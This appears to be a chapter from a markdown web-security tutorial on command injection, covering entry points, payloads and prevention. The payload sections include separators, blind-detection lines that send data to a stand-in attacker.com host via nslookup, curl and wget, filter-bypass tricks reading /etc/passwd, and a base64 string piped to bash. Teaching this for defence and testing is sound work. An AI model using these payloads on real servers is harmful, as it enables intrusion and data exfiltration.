# Command Injection

Command injection allows attackers to execute arbitrary OS commands on the server.

## Entry Points
- Form inputs (search, file names, IP addresses)
- HTTP headers (User-Agent, Referer, Cookie)
- System command features (ping, traceroute, nslookup)

## Common Payloads
### Command Separators
```
;  - Chaining (Linux/Windows)
|  - Pipe
|| - OR condition
&& - AND condition
`cmd` - Substitution (Linux)
$(cmd) - Substitution (Linux)
```

### Blind Detection
```bash
; sleep 5
| nslookup attacker.com
&& curl http://attacker.com/test
|| wget http://attacker.com/$(whoami)
```

### Filter Bypass
```bash
# Without spaces
cat<file
{cat,/etc/passwd}

# Hex encoding
$'\x77\x68\x6f\x61\x6d\x69'  # whoami

# Base64
echo 'd2hvYW1p' | base64 -d | bash

# Wildcard matching
/???/??? /???/??????
```

## Tools
- Commix - automated command injection exploitation
- ffuf with command injection payloads
- Nuclei command injection templates

## Prevention
1. Avoid system calls - use language-native libraries
2. Input validation with allow-lists
3. Use parameterized APIs (execve, subprocess.run with list args)
4. Run with least privilege

```python
# Instead of:
os.system("ping " + ip)

# Use:
import subprocess
subprocess.run(["ping", "-c", "1", ip], capture_output=True)
```

---

> **Next**: [CORS Misconfiguration](14-cors-misconfiguration.md)
